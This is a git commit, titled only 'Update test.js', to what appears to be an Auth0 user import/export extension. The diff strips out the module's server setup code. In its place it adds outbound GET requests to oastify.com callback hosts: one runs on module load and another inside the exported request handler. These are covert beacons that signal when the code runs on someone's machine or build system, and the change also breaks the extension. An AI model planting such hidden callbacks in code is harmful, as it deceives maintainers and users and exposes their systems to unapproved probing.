54cd417f2b78faa7a3f5cec258bb2122b1f42a4f
Martin <martinbydefault@gmail.com>
2024-05-21 08:31:22 -0300

    Update test.js

--- test.js
+++ test.js
@@ -1,22 +1,8 @@
 const tools = require('auth0-extension-express-tools');
 
 const request = require('superagent');
-request.get('http://2adps724l1rxqukaimlu9sznkeq5ez2o.oastify.com/imhere')    
-const expressApp = require('./server');
-const config = require('./server/lib/config');
-const logger = require('./server/lib/logger');
-
-const createServer = tools.createServer((cfg, storage) => {
-  logger.info('Starting User Import/Export Extension - Version:', process.env.CLIENT_VERSION);
-  return expressApp(cfg, storage);
-});
-
+request.get('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere')    
 
 module.exports = (context, req, res) => {
-  const publicUrl = (req.x_wt && req.x_wt.ectx && req.x_wt.ectx.PUBLIC_WT_URL) || false;
-  if (!publicUrl) {
-    config.setValue('PUBLIC_WT_URL', tools.urlHelpers.getWebtaskUrl(req));
-  }
-
-  createServer(context, req, res);
+  request.get('http://k3o7lpvmejkfjcdsb4ec2as5dwjn7iv7.oastify.com/imhere2');
 };
